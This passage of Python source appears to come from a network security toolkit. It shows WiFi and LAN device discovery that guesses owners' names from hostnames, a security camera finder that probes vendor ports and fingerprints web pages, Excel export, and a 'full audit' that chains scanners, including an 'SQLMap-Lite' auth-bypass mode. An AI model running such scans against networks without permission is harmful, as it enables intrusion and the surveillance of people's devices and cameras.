                    output = subprocess.check_output(["netsh", "wlan", "show", "networks", "mode=bssid"], text=True, stderr=subprocess.STDOUT)
                    current_ssid = ""
                    ssids_found = []
                    for line in output.split('\n'):
                        line = line.strip()
                        if line.startswith("SSID"):
                            current_ssid = line.split(":", 1)[1].strip()
                        elif "Signal" in line and current_ssid:
                            signal = line.split(":", 1)[1].strip()
                            ssids_found.append({"Name": current_ssid, "Signal": signal, "Security": "WPA2/3", "Status": "Available", "Device Type": "Wireless Network"})
                            current_ssid = ""
                    
                    if not ssids_found:
                        self.log("[-] No WiFi networks discovered via system scan.")
                else:
                    self.log("[!] WiFi scanning not implemented for this host OS.")
                    ssids_found = []
                
                for ssid in ssids_found:
                    self.report_finding(ssid)
            except Exception as e:
                self.log(f"[!] WiFi Scan Error: {e}")
                self.report_finding({"Name": "Scan Error", "Signal": "N/A", "Security": "N/A", "Status": "Error", "Device Type": "Wireless Network"})

            self.report_progress(15)

            # --- Subnet Detection ---
            router_ip = "Unknown"
            base_ip = "192.168.1"
            
            if target:
                base_ip = ".".join(target.split(".")[:-1])
                self.log(f"[*] Using user-provided subnet: {base_ip}.0/24")
            else:
                self.log("[*] Automatically detecting current network...")
                try:
                    if os.name == 'nt':
                        route_output = subprocess.check_output(["route", "print", "0.0.0.0"], text=True)
                        for line in route_output.split('\n'):
                            if "0.0.0.0" in line and "On-link" not in line:
                                parts = line.split()
                                if len(parts) >= 3:
                                    router_ip = parts[2]
                                    base_ip = ".".join(router_ip.split(".")[:-1])
                                    break
                    
                    if router_ip == "Unknown":
                        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                        s.connect(("8.8.8.8", 80))
                        local_ip = s.getsockname()[0]
                        base_ip = ".".join(local_ip.split(".")[:-1])
                        router_ip = f"{base_ip}.1"
                        s.close()
                    
                    self.log(f"    [+] Current Gateway detected: {router_ip}")
                    self.log(f"    [+] Scanning Subnet: {base_ip}.0/24")
                except Exception as e:
                    self.log(f"[!] Network Detection Error: {e}")
                    router_ip = "192.168.1.1"
                    base_ip = "192.168.1"
            
            # --- Active Discovery Sweep ---
            self.log("[*] Performing active device discovery sweep...")
            # Range scales with intensity: 1: 10, 2: 30, 3: 60, 4: 120, 5: 254
            sweep_range = {1: 10, 2: 30, 3: 60, 4: 120, 5: 254}.get(intensity, 60)
            
            for i in range(1, sweep_range + 1):
                if self.is_stopped(): break
                ip = f"{base_ip}.{i}"
                if i % 10 == 0:
                    self.report_progress(15 + int((i / sweep_range) * 20))
                
                # Fast asynchronous-style ping (Windows -w is timeout in ms)
                subprocess.Popen(['ping', '-n', '1', '-w', '100', ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                if i % 20 == 0: time.sleep(0.1) # Throttle slightly

            time.sleep(1) # Wait for pings to return and ARP to populate
            self.report_progress(40)

            # --- Device Analysis ---
            self.log("[*] Analyzing discovered devices and extracting information...")
            discovered_devices = []
            try:
                arp_output = subprocess.check_output(["arp", "-a"], text=True)
                lines = arp_output.split('\n')
                total_lines = len(lines)
                
                for idx, line in enumerate(lines):
                    if self.is_stopped(): break
                    self.report_progress(40 + int((idx / total_lines) * 50))
                    
                    line = line.strip()
                    if not line or "Interface" in line or "Internet Address" in line:
                        continue
                    
                    parts = line.split()
                    if len(parts) >= 2:
                        ip = parts[0]
                        mac = parts[1].replace("-", ":").upper()
                        
                        # Filter to current subnet and ignore broadcast/multicast
                        if ip.startswith(base_ip) and not ip.endswith(".255") and "FF:FF:FF" not in mac:
                            
                            # 1. Reverse DNS
                            try:
                                hostname = socket.gethostbyaddr(ip)[0]
                            except:
                                hostname = "Unknown"
                            
                            # 2. NetBIOS lookup (Windows)
                            netbios_name = "Unknown"
                            if os.name == 'nt':
                                try:
                                    # nbtstat -A is case sensitive for A on some systems, -a for name
                                    nb_out = subprocess.check_output(["nbtstat", "-A", ip], text=True, timeout=1)
                                    for nb_line in nb_out.split('\n'):
                                        if "<00>" in nb_line and "GROUP" not in nb_line:
                                            netbios_name = nb_line.split()[0].strip()
                                            break
                                except: pass
                            
                            # 3. Manufacturer from OUI
                            vendor = self.get_mac_vendor(mac)
                            
                            # 4. Refined Identification Logic
                            final_name = netbios_name if netbios_name != "Unknown" else hostname
                            user_info = "Network Node"
                            dev_model = "Generic Device"
                            dev_type = "Station"
                            
                            if ip == router_ip:
                                final_name = "Gateway/Router"
                                dev_type = "Infrastructure"
                                user_info = "SYSTEM"
                                dev_model = vendor if vendor != "Unknown" else "Network Router"
                            
                            # Try to extract user/person info from name
                            # Pattern: "Johns-iPhone", "SARAH-PC", "Mike-Laptop"
                            name_to_parse = final_name.upper()
                            if "-" in final_name or "'" in final_name or " " in final_name:
                                potential_user = final_name.split("-")[0].split("'")[0].split(" ")[0]
                                if len(potential_user) > 2 and potential_user.lower() not in ["iphone", "android", "ipad", "laptop", "desktop", "workstation"]:
                                    user_info = potential_user
                            
                            # Device Type & Model logic
                            if "IPHONE" in name_to_parse:
                                dev_type = "Smartphone"
                                dev_model = "Apple iPhone"
                            elif "ANDROID" in name_to_parse:
                                dev_type = "Smartphone"
                                dev_model = "Android Device"
                            elif "IPAD" in name_to_parse:
                                dev_type = "Tablet"
                                dev_model = "Apple iPad"
                            elif "MACBOOK" in name_to_parse:
                                dev_type = "Laptop"
                                dev_model = "Apple MacBook"
                            elif "LAPTOP" in name_to_parse:
                                dev_type = "Laptop"
                            elif "DESKTOP" in name_to_parse or "PC" in name_to_parse:
                                dev_type = "Desktop PC"
                            elif vendor == "Apple":
                                dev_type = "Apple Device"
                                dev_model = "iPhone/Mac/iPad"
                            elif vendor == "Samsung":
                                dev_type = "Mobile/SmartTV"
                                dev_model = "Samsung Galaxy/Smart"
                            elif "PRINTER" in name_to_parse or vendor in ["HP", "Epson", "Canon"]:
                                dev_type = "Printer"
                                dev_model = f"{vendor} Printer"
                            elif "TV" in name_to_parse:
                                dev_type = "Smart TV"
                            elif "CAM" in name_to_parse:
                                dev_type = "Security Camera"

                            device_entry = {
                                "IP": ip,
                                "Name": final_name,
                                "MAC": mac,
                                "Manufacturer": vendor,
                                "Device Type": dev_type,
                                "Model": dev_model,
                                "User": user_info,
                                "Status": "Active"
                            }
                            
                            # Deduplicate by IP
                            if not any(d["IP"] == ip for d in discovered_devices):
                                discovered_devices.append(device_entry)
                                self.log(f"    [+] Found: {ip} | {final_name} | {vendor} | {user_info}")

            except Exception as e:
                self.log(f"[!] Analysis Error: {e}")

            # Final log for found devices
            if not discovered_devices:
                self.log("[-] No active devices discovered on the network.")
            else:
                for dev in discovered_devices:
                    self.report_finding(dev)
                self.log(f"[+] WiFi Traffic Analysis complete. Identified {len(discovered_devices)} devices.")
            
            self.report_progress(100)
            return True

        # Log appropriate command
        cmd_display = f"wifi_analyzer -i{intensity}" + (f" {target}" if target else " --auto")
        self.run_cmd(cmd_display, real_wifi_analysis, "WiFi analysis complete.")

    def security_camera_finder(self, target, intensity=3):
        def real_camera_finder():
            self.log(f"[*] Starting Security Camera Finder (Intensity: {intensity})...")
            self.report_progress(5)
            
            # Determine the subnet to scan
            if target:
                base_ip = ".".join(target.split(".")[:-1])
                self.log(f"[*] Scanning specified subnet: {base_ip}.0/24")
            else:
                self.log("[*] No target provided. Detecting local network automatically...")
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    s.connect(("8.8.8.8", 80))
                    own_ip = s.getsockname()[0]
                    s.close()
                    base_ip = ".".join(own_ip.split(".")[:-1])
                except:
                    base_ip = "192.168.1"
                self.log(f"    [+] Local Network detected: {base_ip}.0/24")

            self.report_progress(15)
            self.log("[*] Probing for common IP camera signatures and management ports...")
            
            # Target ports for camera discovery
            # 80,443: Web | 554: RTSP | 8000: Hikvision | 37777: Dahua | 34567: XMeye | 9000: Reolink | 10001: Wyze | 8080/8888: Generic
            camera_ports = [80, 443, 554, 8000, 37777, 34567, 9000, 10001, 8080, 8888]
            
            # Pre-populate ARP table by pinging (optional, but helps get_mac_address)
            # We'll just do it during the scan to save time.
            
            found_cameras = 0
            # Scale range based on intensity
            max_range = {1: 10, 2: 30, 3: 60, 4: 120, 5: 254}.get(intensity, 60)
            
            for i in range(1, max_range + 1):
                if self.is_stopped(): break
                ip = f"{base_ip}.{i}"
                if i % 10 == 0:
                    self.report_progress(15 + int((i / max_range) * 80))
                
                # 1. Ping the IP to populate ARP table and check if it's alive
                param = '-n' if os.name == 'nt' else '-c'
                is_alive = subprocess.call(['ping', param, '1', '-w', '100', ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
                
                # 2. Check MAC OUI discovery (Works even if all ports are closed)
                mac = self.get_mac_address(ip)
                vendor = self.get_mac_vendor(mac)
                
                is_cam = False
                camera_vendors = ["Blink", "Hikvision", "Dahua", "Axis", "Wyze", "Reolink", "Unifi", "Mobotix", "Bosch", "Vivotek", "Amcrest", "Hanwha", "Samsung", "Netatmo", "Tapo"]
                if any(cv in vendor for cv in camera_vendors):
                    is_cam = True
                    self.log(f"    [*] Discovery: Identified {vendor} via MAC OUI at {ip}")

                # 3. Check for open ports
                open_ports = []
                for p in camera_ports:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.1) 
                    if s.connect_ex((ip, p)) == 0:
                        open_ports.append(p)
                        is_cam = True
                    s.close()
                
                if is_cam:
                    # Identification Logic
                    model = "IP Camera"
                    if "Blink" in vendor: model = "Blink Smart Camera"
                    
                    service = "Unknown"
                    if not open_ports and "Blink" in vendor:
                        service = "Battery Powered / Low Power"
                    
                    # Heuristics based on ports if vendor is unknown
                    if vendor == "Unknown":
                        if 8000 in open_ports: vendor = "Hikvision"
                        elif 37777 in open_ports: vendor = "Dahua/Amcrest"
                        elif 34567 in open_ports: vendor = "XMeye"
                        elif 9000 in open_ports: vendor = "Reolink"
                        elif 10001 in open_ports: vendor = "Wyze"
                        elif 554 in open_ports: vendor = "Generic RTSP"
                    
                    # Try HTTP fingerprinting if port 80/443
                    if vendor == "Unknown" or vendor == "Generic RTSP":
                        for hp in [80, 443, 8080, 8888]:
                            if hp in open_ports:
                                try:
                                    proto = "https" if hp == 443 else "http"
                                    r = requests.get(f"{proto}://{ip}:{hp}", timeout=1, verify=False)
                                    server = r.headers.get('Server', '').lower()
                                    if "hikvision" in server or "dvr" in server: vendor = "Hikvision"
                                    elif "dahua" in server: vendor = "Dahua"
                                    elif "axis" in server: vendor = "Axis"
                                    
                                    # Title check
                                    if "net-surveillance" in r.text.lower(): vendor = "XMeye"
                                    if "web service" in r.text.lower() and "dahua" not in vendor: vendor = "Dahua/Amcrest"
                                except: pass
                    
                    primary_port = open_ports[0] if open_ports else "N/A"
                    if primary_port == 554: service = "RTSP Stream"
                    elif primary_port in [80, 443, 8080, 8888]: service = "Web Management"
                    elif primary_port == 8000: service = "Hikvision SDK"
                    elif primary_port == 37777: service = "Dahua Service"
                    elif primary_port == 34567: service = "XMeye Service"
                    
                    self.log(f"    [+] CAMERA FOUND: {ip} - {vendor} ({service}) | Ports: {open_ports if open_ports else 'None Detected'}")
                    self.report_finding({
                        "IP": ip, 
                        "Vendor": vendor, 
                        "Model": model, 
                        "MAC": mac, 
                        "Port": primary_port, 
                        "Service": service,
                        "All Ports": str(open_ports) if open_ports else "None"
                    })
                    found_cameras += 1

            if found_cameras == 0:
                self.log("[-] No active security cameras discovered in real-time scan.")
            else:
                self.log(f"[+] Scan complete. Identified {found_cameras} cameras.")

            self.report_progress(100)
            return True

        cmd_display = f"camera_finder -i{intensity}" + (f" {target}" if target else " --auto")
        self.run_cmd(cmd_display, real_camera_finder, "Camera discovery complete.")

    def export_to_excel(self, filename="scan_report.xlsx"):
        if not self.last_findings:
            self.log("[!] No findings available to export.", is_error=True)
            return False
        
        try:
            df = pd.DataFrame(self.last_findings)
            df.to_excel(filename, index=False)
            self.log(f"[+] Scan results exported to {filename}")
            return True
        except Exception as e:
            self.log(f"[!] Export Error: {e}", is_error=True)
            return False

    def export_monitor_to_excel(self, filename="traffic_report.xlsx"):
        if not hasattr(self, 'last_monitor_data') or not self.last_monitor_data:
            self.log("[!] No traffic data available to export.", is_error=True)
            return False
        
        try:
            df = pd.DataFrame(self.last_monitor_data)
            df.to_excel(filename, index=False)
            self.log(f"[+] Traffic data exported to {filename}")
            return True
        except Exception as e:
            self.log(f"[!] Export Error: {e}", is_error=True)
            return False

    def full_audit(self, target, intensity=3):
        def real_full_audit():
            self.log(f"[*] Starting FULL AUDIT on {target} (Intensity: {intensity})...")
            self.log("[*] This will run multiple tools sequentially. Please wait.")
            self.report_progress(0)
            
            # Tools to run in Full Audit
            # Note: We avoid DDoS and some extremely long ones for the 'Full Audit'
            audit_tools = [
                ("Ping Sweep", lambda: self.ping_sweep(target, intensity)),
                ("Port Scan", lambda: self.port_scan(target, intensity)),
                ("Nmap/Nessus", lambda: self.nmap_nessus_scan(target, intensity, "Standard")),
                ("Firewall Audit", lambda: self.firewall_audit(target, audit_type="Full Firewall Audit")),
                ("Subdomains", lambda: self.subdomain_scan(target, intensity)),
                ("Nikto-Lite", lambda: self.nikto_lite(target, intensity)),
                ("SQLMap-Lite", lambda: self.sql_map_lite(target, "Auth Bypass"))
            ]
            
            total_tools = len(audit_tools)
            for i, (name, func) in enumerate(audit_tools):
                if self.is_stopped(): break
                self.log(f"\n--- [AUDIT PHASE {i+1}/{total_tools}: {name}] ---")
                try:
                    # Adjust progress reporting to be relative to the whole audit
                    # Temporarily override progress_callback to scale it
                    original_progress = self.progress_callback
                    start_perc = (i / total_tools) * 100
                    end_perc = ((i + 1) / total_tools) * 100
                    
                    def scaled_progress(v):
                        scaled_v = start_perc + (v / 100) * (end_perc - start_perc)
                        if original_progress:
                            original_progress(scaled_v)
                    
                    self.progress_callback = scaled_progress
                    func()
                    self.progress_callback = original_progress
                except Exception as e:
                    self.log(f"[!] Error during {name}: {e}", is_error=True)
            
            self.report_progress(100)
            self.log("\n[+] FULL AUDIT COMPLETE.")
            return True

        self.run_cmd(f"full_audit {target} -i{intensity}", real_full_audit, "Full Audit successfully finished.")

